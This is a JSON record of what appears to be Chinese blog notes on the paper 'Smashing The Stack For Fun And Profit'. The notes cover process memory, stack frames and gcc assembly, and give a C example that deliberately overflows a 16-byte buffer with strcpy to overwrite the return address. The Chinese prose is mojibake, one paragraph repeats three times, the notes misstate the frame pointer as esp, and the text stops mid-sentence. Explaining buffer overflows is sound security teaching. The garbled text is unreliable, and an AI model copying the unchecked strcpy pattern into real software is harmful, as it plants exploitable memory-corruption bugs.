[{"categories":["reverseï¼Œpwn"],"content":"è®ºæ–‡é˜…è¯»ç¬”è®°ï¼šSmashing The Stack For Fun And Profit  åŸæ–‡ï¼šSmashing The Stack For Fun And Profit\n åº åœ¨Cç¼–ç¨‹å®ç°ä¸­ï¼ŒSmashing the stackï¼Œå‘ç¨‹åºä¸­ä¸€ä¸ªè¢«å®šä¹‰çš„æ•°ç»„çš„æœ«å°¾å†™å…¥ä¸€äº›ä¸œè¥¿å¯ä»¥ç ´åå †æ ˆçš„æ‰§è¡Œç»“æ„ï¼Œè¿™æ˜¯æœ‰å¯èƒ½çš„ã€‚æ‰§è¡Œè¿™ä¸ªå†™æ“ä½œçš„ä»£ç (codeï¼Œç°åœ¨ä¹Ÿå¯ä»¥å«åšshellcode)å¯èƒ½ä¼šç ´åå †æ ˆç»“æ„ï¼Œå¹¶ä¸”å¯¼è‡´ç¨‹åºè¿”å›ä¹‹åè·³å‘ä¸€ä¸ªéšæœºçš„åœ°å€ã€‚è¿™å¯èƒ½äº§ç”Ÿä¸€äº›æœ€éšè”½çš„ä¾èµ–æ•°æ®æ‰èƒ½å‘ç°çš„bugã€‚è¿™ä¸ªå˜é‡ï¼ˆæŒ‡ä¸Šæ–‡ä¸­çš„codeï¼‰åŒ…æ‹¬å †æ ˆåƒåœ¾åŒ–ï¼ˆtrash the stackï¼‰ã€å †æ ˆä¹±å†™ï¼ˆscribble the stackï¼‰ã€å †æ ˆè¢«ç ´åï¼ˆmangle the stackï¼‰ï¼›æœ¯è¯­mung the stackå¹¶æœªè¢«ä½¿ç”¨(the term mung the stack is not usedï¼Œæ„Ÿè§‰æ€ªæ€ªçš„)ï¼Œæ­£å¦‚è¿™ä¸æ˜¯è¢«æ•…æ„ä½¿ç”¨çš„ã€‚çœ‹çœ‹å¯¼è‡´çš„åæœ(See spam)ï¼Œåˆ«åbugã€åœ¨å†…æ ¸ä¸­ä»»æ„æ‰§è¡Œã€å†…å­˜æ³„æ¼ã€ä¼˜å…ˆæƒä¸¢å¤±ã€overrun screwã€‚\nIntroduction åœ¨è¿‡å»çš„å‡ ä¸ªæœˆä¸­ï¼Œå‘ç°å’Œåˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„äººæ•°å¤§å¤§å¢åŠ ã€‚ æ¯”å¦‚syslogï¼Œsplitvtï¼Œsendmail 8.7.5ï¼ŒLinux / FreeBSDæŒ‚è½½ï¼ŒXtåº“ç­‰ã€‚æœ¬æ–‡è¯•å›¾è§£é‡Šç¼“å†²åŒºæº¢å‡ºæ˜¯ä»€ä¹ˆï¼Œä»¥åŠå®ƒä»¬çš„åˆ©ç”¨æ–¹å¼ã€‚ è¿™éœ€è¦åŸºæœ¬çš„æ±‡ç¼–çŸ¥è¯†ã€‚ è™šæ‹Ÿå†…å­˜æ¦‚å¿µçš„ç†è§£å’Œä½¿ç”¨gdbçš„ç»éªŒå¯¹æ­¤éå¸¸æœ‰å¸®åŠ©ï¼Œä½†ä¸æ˜¯å¿…éœ€çš„ã€‚ æˆ‘ä»¬è¿˜å‡å®šæˆ‘ä»¬æ­£åœ¨ä½¿ç”¨Intel x86 CPUï¼Œå¹¶ä¸”æ“ä½œç³»ç»Ÿæ˜¯Linuxã€‚\nåœ¨æˆ‘ä»¬å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä¸€äº›åŸºæœ¬å®šä¹‰ï¼šç¼“å†²åŒºåªæ˜¯è®¡ç®—æœºå†…å­˜çš„ä¸€ä¸ªè¿ç»­å—ï¼Œå…¶ä¸­åŒ…å«ç›¸åŒæ•°æ®ç±»å‹çš„å¤šä¸ªå®ä¾‹ã€‚ Cç¨‹åºå‘˜é€šå¸¸äº†è§£å­—ç¼“å†²åŒºæ•°ç»„ï¼Œ æœ€å¸¸è§çš„å°±æ˜¯å­—ç¬¦æ•°ç»„ã€‚ åƒCä¸­çš„æ‰€æœ‰å˜é‡ä¸€æ ·ï¼Œæ•°ç»„å¯ä»¥å£°æ˜ä¸ºé™æ€æˆ–åŠ¨æ€ã€‚ é™æ€å˜é‡åœ¨åŠ è½½æ—¶åœ¨æ•°æ®æ®µä¸Šåˆ†é…ã€‚ åŠ¨æ€å˜é‡æ˜¯åœ¨è¿è¡Œæ—¶åœ¨å †æ ˆä¸Šåˆ†é…çš„ã€‚ æº¢å‡ºæ˜¯æŒ‡è¶…è¿‡æ ˆé¡¶ã€è¶…å‡ºè¾¹ç•Œç­‰ç­‰ã€‚ æˆ‘ä»¬è¿™é‡Œå°†åªå…³æ³¨åŠ¨æ€ç¼“å†²åŒºçš„æº¢å‡ºï¼Œå³åŸºäºå †æ ˆçš„ç¼“å†²åŒºæº¢å‡ºã€‚\nProcess Memory Organization è¦äº†è§£ä»€ä¹ˆæ˜¯å †æ ˆç¼“å†²åŒºï¼Œæˆ‘ä»¬å¿…é¡»é¦–å…ˆäº†è§£å†…å­˜ä¸­è¿›ç¨‹çš„ç»„ç»‡æ–¹å¼ã€‚è¿›ç¨‹è¢«åˆ†ä¸ºä¸‰ä¸ªåŒºåŸŸï¼šæ–‡æœ¬æ®µï¼Œæ•°æ®æ®µå’Œå †æ ˆã€‚æˆ‘ä»¬å°†é›†ä¸­è®¨è®ºå †æ ˆï¼Œä½†æ˜¯é¦–å…ˆè¦å¯¹å…¶ä»–ä¸¤ä¸ªè¿›è¡Œä¸€äº›æ¦‚è¿°ã€‚æ–‡æœ¬æ®µç”±ç¨‹åºå›ºå®šï¼ŒåŒ…æ‹¬ä»£ç ï¼ˆæŒ‡ä»¤ï¼‰å’Œåªè¯»æ•°æ®ã€‚æ­¤åŒºåŸŸå¯¹åº”äºå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡æœ¬éƒ¨åˆ†ï¼Œé€šå¸¸æ ‡è®°ä¸ºâ€œåªè¯»â€ï¼Œä»»ä½•å¯¹è¯¥éƒ¨åˆ†çš„å†™æ“ä½œéƒ½å°†å¯¼è‡´æ®µé”™è¯¯ï¼ˆsegment faultï¼‰ã€‚æ•°æ®åŒºåŸŸåŒ…å«å·²åˆå§‹åŒ–æ•°æ®å’Œæœªåˆå§‹åŒ–çš„æ•°æ®ã€‚é™æ€å˜é‡å­˜å‚¨åœ¨è¯¥åŒºåŸŸä¸­ã€‚æ•°æ® åŒºåŸŸå¯¹åº”äºå¯æ‰§è¡Œæ–‡ä»¶çš„.data(å·²åˆå§‹åŒ–) å’Œ .bss(æœªåˆå§‹åŒ–)éƒ¨åˆ†ã€‚å¯ä»¥ä½¿ç”¨brkï¼ˆ2ï¼‰system callæ¥æ›´æ”¹å…¶å¤§å°ã€‚å¦‚æœ .bss ä¸­çš„æ•°æ®è¿›è¡Œæ‰©å±•æˆ–ç”¨æˆ·å †æ ˆè€—å°½äº†å¯ç”¨çš„å†…å­˜ï¼Œåˆ™è¯¥è¿›ç¨‹å°†è¢«é˜»å¡å¹¶é‡æ–°åˆ†é…æ›´å¤§çš„å†…å­˜ç©ºé—´å†æ¬¡è¿è¡Œã€‚åœ¨.dataæ•°æ®æ®µå’Œå †æ ˆæ®µä¹‹é—´æ·»åŠ äº†æ–°çš„å†…å­˜ã€‚\nWhat Is A Stack? å †æ ˆæ˜¯è®¡ç®—æœºç§‘å­¦ä¸­ç»å¸¸ä½¿ç”¨çš„ä¸€ç§æŠ½è±¡æ•°æ®ç±»å‹ã€‚å¯¹è±¡å †æ ˆçš„å±æ€§æ˜¯ï¼Œæ”¾ç½®åœ¨å †æ ˆä¸Šçš„æœ€åä¸€ä¸ªå¯¹è±¡å°†æ˜¯åˆ é™¤çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ã€‚è¿™ç§ç‰¹æ€§é€šå¸¸ç§°ä¸ºå…ˆè¿›åå‡ºé˜Ÿåˆ—æˆ–LIFO(Last in First out)ã€‚åœ¨å †æ ˆä¸Šå®šä¹‰äº†å‡ ä¸ªæ“ä½œï¼Œæœ€é‡è¦çš„ä¸¤ä¸ªæ˜¯PUSHå’ŒPOPã€‚PUSHåœ¨å †æ ˆé¡¶éƒ¨æ·»åŠ ä¸€ä¸ªå…ƒç´ ï¼Œç›¸ååœ°ï¼ŒPOPé€šè¿‡åˆ é™¤å †æ ˆé¡¶éƒ¨çš„æœ€åä¸€ä¸ªå…ƒç´ å°†å †æ ˆå¤§å°å‡å°äº†ä¸€ä¸ªã€‚\nWhy Do We Use A Stack? ç°ä»£è®¡ç®—æœºçš„è®¾è®¡è€ƒè™‘äº†é«˜çº§è¯­è¨€çš„éœ€æ±‚ã€‚ç”¨äºæ„é€ é«˜çº§è¯­è¨€å¼•å…¥çš„ç¨‹åºçš„æœ€é‡è¦æŠ€æœ¯æ˜¯è¿‡ç¨‹æˆ–å‡½æ•°ã€‚ä»ä¸€ä¸ªè§’åº¦æ¥çœ‹ï¼Œè¿‡ç¨‹è°ƒç”¨ä¼šåƒè·³è½¬ä¸€æ ·æ”¹å˜æ§åˆ¶æµï¼Œä½†æ˜¯ä¸è·³è½¬ä¸åŒï¼Œè¿‡ç¨‹è°ƒç”¨å®Œæˆåï¼Œå‡½æ•°ä¼šå°†æ§åˆ¶æƒè¿”å›ç»™è°ƒç”¨åçš„è¯­å¥æˆ–æŒ‡ä»¤ã€‚è¿™ç§é«˜çº§æŠ½è±¡æ˜¯åœ¨å †æ ˆçš„å¸®åŠ©ä¸‹å®ç°çš„ã€‚å †æ ˆè¿˜ç”¨äºåŠ¨æ€åˆ†é…å‡½æ•°ä¸­ä½¿ç”¨çš„å±€éƒ¨å˜é‡ï¼Œå°†å‚æ•°ä¼ é€’ç»™å‡½æ•°ä»¥åŠä»å‡½æ•°è·å–è¿”å›å€¼\nThe Stack Region å †æ ˆæ˜¯ä¸€ä¸ªåŒ…å«æ•°æ®çš„è¿ç»­å†…å­˜å—ã€‚ç§°ä¸ºå †æ ˆæŒ‡é’ˆï¼ˆSPï¼‰çš„å¯„å­˜å™¨æŒ‡å‘å †æ ˆçš„é¡¶éƒ¨ã€‚å †æ ˆçš„åº•éƒ¨ä½äºå›ºå®šåœ°å€ã€‚å®ƒçš„å¤§å°ç”±å†…æ ¸åœ¨è¿è¡Œæ—¶åŠ¨æ€è°ƒæ•´ã€‚CPUæ‰§è¡ŒæŒ‡ä»¤ä»¥å‹å…¥å †æ ˆå’Œä»å †æ ˆå¼¹å‡ºã€‚å †æ ˆç”±é€»è¾‘å †æ ˆå¸§ç»„æˆï¼Œè¿™äº›é€»è¾‘å †æ ˆå¸§åœ¨è°ƒç”¨å‡½æ•°æ—¶è¢«å‹å…¥ï¼Œ åœ¨è¿”å›æ—¶å¼¹å‡ºã€‚æ ˆå¸§åŒ…å«å‡½æ•°çš„å‚æ•°ï¼Œå±€éƒ¨å˜é‡ä»¥åŠæ¢å¤å…ˆå‰å †æ ˆæ‰€éœ€çš„æ•°æ®å¸§ï¼ŒåŒ…æ‹¬å‡½æ•°è°ƒç”¨æ—¶æŒ‡ä»¤æŒ‡é’ˆçš„å€¼ã€‚æ ¹æ®å®ç°çš„ä¸åŒï¼Œå †æ ˆå°†å‘ä¸‹å¢é•¿ï¼ˆå‘è¾ƒä½çš„å­˜å‚¨å™¨åœ°å€ï¼‰æˆ–å‘ä¸Šå¢é•¿ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨é€æ¸å˜å°çš„å †æ ˆï¼ˆå³æ ˆç”±é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ï¼‰ã€‚è¿™ç§å †æ ˆå¢é•¿æ–¹å¼åº”ç”¨äºåŒ…æ‹¬Intelï¼ŒMotorolaï¼ŒSPARCå’ŒMIPSå¤„ç†å™¨åœ¨å†…çš„è®¸å¤šè®¡ç®—æœºå¤„ç†å™¨ä¸Šã€‚åŒæ—¶ï¼Œå †æ ˆæŒ‡é’ˆï¼ˆSPï¼‰ä¹Ÿä¾èµ–äºè¿™ç§å®ç°ã€‚å®ƒï¼ˆspï¼‰å¯èƒ½æŒ‡å‘å †æ ˆä¸Šçš„æœ€åä¸€ä¸ªåœ°å€ï¼Œæˆ–è€…æŒ‡å‘å †æ ˆä¹‹åçš„ä¸‹ä¸€ä¸ªå¯ç”¨ç©ºé—²åœ°å€ã€‚å¯¹äºæˆ‘ä»¬çš„è®¨è®ºï¼Œæˆ‘ä»¬å‡è®¾å®ƒæŒ‡å‘å †æ ˆä¸­çš„æœ€åä¸€ä¸ªåœ°å€ã€‚é™¤äº†æŒ‡å‘å †æ ˆé¡¶éƒ¨ï¼ˆæœ€ä½æ•°å­—åœ°å€ï¼‰çš„å †æ ˆæŒ‡é’ˆå¤–ï¼Œé€šå¸¸è¿˜æœ‰æŒ‡å‘å›ºå®šä½ç½®çš„å¸§çš„å¸§æŒ‡é’ˆï¼ˆFPï¼‰ã€‚ä¸€äº›æ–‡æœ¬ä¹Ÿå°†å…¶ç§°ä¸ºæœ¬åœ°åŸºæŒ‡é’ˆï¼ˆLBï¼‰ã€‚åŸåˆ™ä¸Šï¼Œå¯ä»¥é€šè¿‡ç»™å‡ºå±€éƒ¨å˜é‡ä¸SPçš„åç§»é‡æ¥å¼•ç”¨å±€éƒ¨å˜é‡ã€‚ä½†æ˜¯ï¼Œéšç€å­—ï¼ˆæ•°æ®ï¼‰è¢«å‹å…¥å †æ ˆå¹¶ä»å †æ ˆå¼¹å‡ºï¼Œè¿™äº›åç§»é‡ä¼šå‘ç”Ÿå˜åŒ–ã€‚å°½ç®¡åœ¨æŸäº›æƒ…å†µä¸‹ç¼–è¯‘å™¨å¯ä»¥è·Ÿè¸ªå †æ ˆä¸Šçš„å­—æ•°å¹¶å› æ­¤çº æ­£åç§»é‡ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹å®ƒä¸èƒ½ï¼Œå¹¶ä¸”åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½éœ€è¦å¤§é‡ç®¡ç†ã€‚æ­¤å¤–ï¼Œåœ¨æŸäº›æœºå™¨ï¼ˆä¾‹å¦‚åŸºäºIntelçš„å¤„ç†å™¨ï¼‰ä¸Šï¼Œä»¥è·SPå·²çŸ¥è·ç¦»è®¿é—®å˜é‡éœ€è¦å¤šä¸ªæŒ‡ä»¤ã€‚å› æ­¤ï¼Œè®¸å¤šç¼–è¯‘å™¨ä½¿ç”¨ç¬¬äºŒä¸ªå¯„å­˜å™¨FPæ¥å¼•ç”¨å±€éƒ¨å˜é‡å’Œå‚æ•°ï¼Œå› ä¸ºå®ƒä»¬ä¸FPçš„è·ç¦»ä¸ä¼šéšPUSHå’ŒPOPçš„å˜åŒ–è€Œå˜åŒ–ã€‚åœ¨Intel CPUä¸Šï¼ŒBPï¼ˆEBPï¼‰ç”¨äºæ­¤ç›®çš„ã€‚åœ¨Motorola CPUä¸Šï¼Œé™¤A7ï¼ˆå †æ ˆæŒ‡é’ˆï¼‰ä»¥å¤–çš„ä»»ä½•åœ°å€å¯„å­˜å™¨éƒ½å¯ä»¥ã€‚\nç”±äºå †æ ˆå¢é•¿çš„æ–¹å¼ï¼Œå®é™…å‚æ•°ä¸FPçš„åç§»é‡ä¸ºæ­£ï¼Œå±€éƒ¨å˜é‡çš„åç§»é‡ä¸ºè´Ÿã€‚å‡½æ•°è¢«è°ƒç”¨æ—¶å¿…é¡»åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯ä¿å­˜å…ˆå‰çš„FPï¼ˆä»¥ä¾¿å¯ä»¥åœ¨å‡½æ•°é€€å‡ºæ—¶å°†å…¶è¿˜åŸï¼‰ã€‚ç„¶åï¼Œå®ƒå°†SPå¤åˆ¶åˆ°FP(ebp)ä¸­ä»¥åˆ›å»ºæ–°çš„FP(esp)ï¼Œå¹¶æ¨è¿›SPæ¥ä¸ºå±€éƒ¨å˜é‡ä¿ç•™ç©ºé—´ã€‚æ­¤ä»£ç ç§°ä¸ºè¿‡ç¨‹è°ƒç”¨ï¼ˆthe procedure prologã€è¿‡ç¨‹åºè¨€ï¼‰ã€‚é€€å‡ºå‡½æ•°åï¼Œå¿…é¡»å†æ¬¡æ¸…ç†å †æ ˆï¼Œ è¿™ç§°ä¸ºè¿‡ç¨‹ç»“å°¾ã€‚æä¾›äº†è‹±ç‰¹å°”ENTERå’ŒLEAVEæŒ‡ä»¤ä»¥åŠMotorola LINKå’ŒUNLINKæŒ‡ä»¤ï¼Œä»¥é«˜æ•ˆåœ°æ‰§è¡Œå¤§å¤šæ•°è¿‡ç¨‹åºè¨€å’Œç»“è¯­ã€‚\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸ªç®€å•ç¤ºä¾‹ä¸­çš„å †æ ˆï¼š è¿‡ç¨‹è¢«è°ƒç”¨æ—¶å¿…é¡»åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯ä¿å­˜å…ˆå‰çš„FPï¼ˆä»¥ä¾¿å¯ä»¥åœ¨è¿‡ç¨‹é€€å‡ºæ—¶å°†å…¶è¿˜åŸï¼‰ã€‚ç„¶åï¼Œå®ƒå°†SPå¤åˆ¶åˆ°FP(ebp)ä¸­ä»¥åˆ›å»ºæ–°çš„FP(esp)ï¼Œå¹¶æ¨è¿›SPæ¥ä¸ºå±€éƒ¨å˜é‡ä¿ç•™ç©ºé—´ ã€‚æ­¤ä»£ç ç§°ä¸ºè¿‡ç¨‹åºè¨€ã€‚é€€å‡ºè¿‡ç¨‹åï¼Œå¿…é¡»å†æ¬¡æ¸…ç†å †æ ˆï¼Œè¿™ç§°ä¸ºè¿‡ç¨‹ç»“å°¾ã€‚æä¾›äº†è‹±ç‰¹å°”ENTERå’ŒLEAVEæŒ‡ä»¤ä»¥åŠMotorola LINKå’ŒUNLINKæŒ‡ä»¤ï¼Œä»¥é«˜æ•ˆåœ°æ‰§è¡Œå¤§å¤šæ•°è¿‡ç¨‹åºè¨€å’Œç»“è¯­ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªç®€å•ç¤ºä¾‹ä¸­çš„å †æ ˆï¼šè¿‡ç¨‹è¢«è°ƒç”¨æ—¶å¿…é¡»åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯ä¿å­˜å…ˆå‰çš„FPï¼ˆä»¥ä¾¿å¯ä»¥åœ¨è¿‡ç¨‹é€€å‡ºæ—¶å°†å…¶è¿˜åŸï¼‰ã€‚ç„¶åï¼Œå®ƒå°†SPå¤åˆ¶åˆ°FPä¸­ä»¥åˆ›å»ºæ–°çš„FPï¼Œå¹¶æ¨è¿›SPæ¥ä¸ºå±€éƒ¨å˜é‡ä¿ç•™ç©ºé—´ã€‚æ­¤ä»£ç ç§°ä¸ºè¿‡ç¨‹åºè¨€ã€‚é€€å‡ºè¿‡ç¨‹åï¼Œå¿…é¡»å†æ¬¡æ¸…ç†å †æ ˆï¼Œè¿™ç§°ä¸ºè¿‡ç¨‹ç»“å°¾ã€‚æä¾›äº†è‹±ç‰¹å°”ENTERå’ŒL EAVEæŒ‡ä»¤ä»¥åŠMotorola LINKå’ŒUNLINKæŒ‡ä»¤ï¼Œä»¥é«˜æ•ˆåœ°æ‰§è¡Œå¤§å¤šæ•°è¿‡ç¨‹åºè¨€å’Œç»“è¯­ã€‚\n1 2 3 4 5 6 7 8 9  //example1.c void function(int a, int b, int c){ char buffer1[5]; char buffer2[10]; } void main(){ function(1,2,3); }   å»ç†è§£mainå‡½æ•°ä¸­è°ƒç”¨functionå‡½æ•°æ—¶å‘ç”Ÿäº†ä»€ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥ç”¨gcc çš„-Sé€‰é¡¹ç”Ÿæˆæ±‡ç¼–è¯­è¨€\n æˆ‘ä»¬åœ¨64bitç¼–è¯‘è¦åŠ ä¸Šé€‰é¡¹-m32 ï¼Œå¦åˆ™ä¼šå‘ç°æ±‡ç¼–å‡ºæ¥å’Œè®ºæ–‡ä¸­ä¸åŒï¼Œå› ä¸ºè®ºæ–‡ä¸­ç”¨çš„æ˜¯32bitç¯å¢ƒ\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99  $ gcc -S -o example1.s example1.c -m32 $ cat ./example1.s .file\t\"example1.c\" .text .globl\tfunction .type\tfunction, @function function: .LFB0: .cfi_startproc endbr32 pushl\t%ebp .cfi_def_cfa_offset 8 .cfi_offset 5, -8 movl\t%esp, %ebp .cfi_def_cfa_register 5 subl\t$24, %esp call\t__x86.get_pc_thunk.ax addl\t$_GLOBAL_OFFSET_TABLE_, %eax movl\t%gs:20, %eax movl\t%eax, -12(%ebp) xorl\t%eax, %eax nop movl\t-12(%ebp), %eax xorl\t%gs:20, %eax je\t.L2 call\t__stack_chk_fail_local .L2: leave .cfi_restore 5 .cfi_def_cfa 4, 4 ret .cfi_endproc .LFE0: .size\tfunction, .-function .globl\tmain .type\tmain, @function main: .LFB1: .cfi_startproc endbr32 leal\t4(%esp), %ecx .cfi_def_cfa 1, 0 andl\t$-16, %esp pushl\t-4(%ecx) pushl\t%ebp .cfi_escape 0x10,0x5,0x2,0x75,0 movl\t%esp, %ebp pushl\t%ecx .cfi_escape 0xf,0x3,0x75,0x7c,0x6 subl\t$4, %esp call\t__x86.get_pc_thunk.ax addl\t$_GLOBAL_OFFSET_TABLE_, %eax subl\t$4, %esp pushl\t$3 pushl\t$2 pushl\t$1 call\tfunction addl\t$16, %esp nop movl\t-4(%ebp), %ecx .cfi_def_cfa 1, 0 leave .cfi_restore 5 leal\t-4(%ecx), %esp .cfi_def_cfa 4, 4 ret .cfi_endproc .LFE1: .size\tmain, .-main .section\t.text.__x86.get_pc_thunk.ax,\"axG\",@progbits,__x86.get_pc_thunk.ax,comdat .globl\t__x86.get_pc_thunk.ax .hidden\t__x86.get_pc_thunk.ax .type\t__x86.get_pc_thunk.ax, @function __x86.get_pc_thunk.ax: .LFB2: .cfi_startproc movl\t(%esp), %eax ret .cfi_endproc .LFE2: .hidden\t__stack_chk_fail_local .ident\t\"GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0\" .section\t.note.GNU-stack,\"\",@progbits .section\t.note.gnu.property,\"a\" .align 4 .long\t1f - 0f .long\t4f - 1f .long\t5 0: .string\t\"GNU\" 1: .align 4 .long\t0xc0000002 .long\t3f - 2f 2: .long\t0x3 3: .align 4 4:   é€šè¿‡è§‚å¯Ÿæ±‡ç¼–è¯­è¨€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°function()çš„å‡½æ•°è°ƒç”¨è¢«ç¿»è¯‘ä¸º\n;32bit version pushl $3 pushl $2 pushl $1 call function ;64bit version movl\t$3, %edx movl\t$2, %esi movl\t$1, %edi call\tfunction è¿™å°†3ä¸ªå‚æ•°æ”¾å…¥æ ˆä¸­ï¼Œç„¶åè°ƒç”¨function()å‡½æ•°ã€‚callæŒ‡ä»¤å°†ä¼šæŠŠæŒ‡ä»¤å¯„å­˜å™¨ï¼ˆInstruction Pointerï¼ŒIPï¼‰çš„å€¼æ”¾å…¥æ ˆä¸­ï¼Œå°†ä¿å­˜åœ¨æ ˆä¸­çš„IPçš„å€¼ç§°ä¸ºè¿”å›åœ°å€ï¼ˆRETï¼‰ã€‚å‡½æ•°ä¸­ç¬¬ä¸€ä»¶äº‹æ‰€åšçš„æ˜¯procedure prologï¼ˆç¿»è¯‘æˆè¿‡ç¨‹è°ƒç”¨ï¼Ÿï¼‰\npushl %ebp movl %esp,%ebp subl $20,%esp è¿™å°†EBPï¼ˆæ ˆåº•æŒ‡é’ˆï¼‰æ”¾å…¥æ ˆä¸­ï¼Œç„¶åå°†ç°åœ¨çš„SP(espã€rspï¼Œæ ˆé¡¶æŒ‡é’ˆ)æ”¾å…¥EBPä¸­ï¼Œæ˜¯å…¶æˆä¸ºæ–°çš„æ ˆåº•æŒ‡é’ˆã€‚å°†å·²ç»ä¿å­˜çš„æ ˆå¸§æŒ‡é’ˆï¼ˆFPï¼‰ç§°ä¸ºSFPã€‚ç„¶åå°†espå‡å»å±€éƒ¨å˜é‡çš„å¤§å°ï¼Œä¸ºå±€éƒ¨å˜é‡åˆ†é…ç©ºé—´ã€‚\næˆ‘ä»¬å¿…é¡»è®°ä½ï¼Œå†…å­˜åªèƒ½ä»¥å­—å¤§å°çš„å€æ•°æ¥å¯»å€ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œä¸€ä¸ªå­—æ˜¯4Byteï¼Œæˆ–32ä½ã€‚æ‰€ä»¥æˆ‘ä»¬çš„5å­—èŠ‚ç¼“å†²åŒºéœ€è¦8å­—èŠ‚ï¼ˆ2ä¸ªå­—ï¼‰çš„å†…å­˜ï¼Œ10å­—èŠ‚ç¼“å†²åŒºéœ€è¦12å­—èŠ‚ï¼ˆ3ä¸ªå­—ï¼‰çš„å†…å­˜ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆSPè¢«å‡å»20ã€‚è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œè°ƒç”¨function()æ—¶æˆ‘ä»¬çš„å †æ ˆçœ‹èµ·æ¥æ˜¯è¿™æ ·çš„ï¼ˆæ¯ä¸ªç©ºæ ¼ä»£è¡¨ä¸€ä¸ªå­—èŠ‚ï¼‰ï¼š\n ä¸‹å›¾ä¸­ï¼Œå·¦è¾¹ä¸ºä½åœ°å€ï¼Œå³è¾¹ä¸ºé«˜åœ°å€ã€‚å·¦è¾¹ä¸ºæ ˆé¡¶ï¼Œå³è¾¹ä¸ºæ ˆåº•ã€‚\n Buffer Overflows ç¼“å†²åŒºæº¢å‡ºæ˜¯ç”±äºå‘ç¼“å†²åŒºä¸­å¡«å……çš„æ•°æ®è¶…å‡ºå…¶å¤„ç†èƒ½åŠ›è€Œå¯¼è‡´çš„ã€‚å¦‚ä½•åˆ©ç”¨è¿™ä¸ªç»å¸¸å‘ç°çš„ç¼–ç¨‹é”™è¯¯æ¥æ‰§è¡Œä»»æ„ä»£ç å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  //example2.c void function(char *str) { char buffer[16]; strcpy(buffer,str); } void main() { char large_string[256]; int i; for( i = 0; i \u003c 255; i++) large_string[i] = 'A'; function(large_string); }   è¿™ä¸ªç¨‹åºæœ‰ä¸€ä¸ªå…¸å‹çš„ç¼“å†²åŒºæº¢å‡ºç¼–ç é”™è¯¯çš„å‡½æ•°ã€‚å‡½æ•°é€šè¿‡ä½¿ç”¨strcpy()è€Œä¸æ˜¯ä½¿ç”¨æœ‰è¾¹ç•Œæ£€æŸ¥çš„strncpy()å»å¤åˆ¶å­—ç¬¦ä¸²ã€‚å¦‚æœä½ è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œä½ ä¼šå¾—åˆ°ä¸€ä¸ªæ®µé”™è¯¯(segmentation violation)ã€‚è®©æˆ‘ä»¬çœ‹çœ‹è°ƒç”¨å‡½æ•°æ—¶å®ƒçš„å †æ ˆæ˜¯ä»€ä¹ˆæ ·å­çš„\nè¿™é‡Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆæˆ‘ä»¬ä¼šé‡åˆ°æ®µé”™è¯¯ï¼Ÿç®€å•æ¥è¯´ï¼Œstrcpy() æ­£åœ¨å¤åˆ¶å†…å®¹å°†*strï¼ˆé•¿å­—ç¬¦æ•°ç»„ï¼‰æ’å…¥buffer[]ä¸­ï¼Œç›´åˆ°åœ¨å­—ç¬¦ä¸²*strä¸Šæ‰¾åˆ°ç©ºå­—ç¬¦(\\0)ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°buffer[]æ¯”*strå°å¾—å¤šã€‚buffer[]çš„é•¿åº¦ä¸º16ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°è¯•å°†å…¶å¡«å……ä¸º256ä¸ªå­—èŠ‚ã€‚è¿™æ„å‘³ç€å †æ ˆä¸­ç¼“å†²åŒºä¹‹åçš„æ‰€æœ‰240ä¸ªå­—èŠ‚éƒ½å°†è¢«è¦†ç›–ã€‚è¿™åŒ…æ‹¬SFPï¼ŒRET ç”šè‡³* strï¼æˆ‘ä»¬å·²ç»è£…æ»¡äº† large_string å­—ç¬¦â€œ Aâ€ã€‚å®ƒçš„åå…­è¿›åˆ¶å­—ç¬¦å€¼ä¸º0x41ã€‚è¿™æ„å‘³ç€è¿”å›åœ°å€ç°åœ¨ä¸º0x41414141ã€‚è¿™è¶…å‡ºäº†è¿›ç¨‹åœ°å€ç©ºé—´ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå½“å‡½æ•°è¿”å›å¹¶å°è¯•ä»è¯¥åœ°å€è¯»å–ä¸‹ä¸€æ¡æŒ‡ä»¤æ—¶ï¼Œä½ ä¼šé‡åˆ°æ®µé”™è¯¯çš„åŸå› ã€‚å› æ­¤ï¼Œç¼“å†²åŒºæº¢å‡ºä½¿æˆ‘ä»¬å¯ä»¥æ›´æ”¹å‡½æ•°çš„è¿”å›åœ°å€ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚è®©æˆ‘ä»¬å›åˆ°ç¬¬ä¸€ä¸ªç¤ºä¾‹ï¼Œå¹¶å›é¡¾ä¸€ä¸‹å †æ 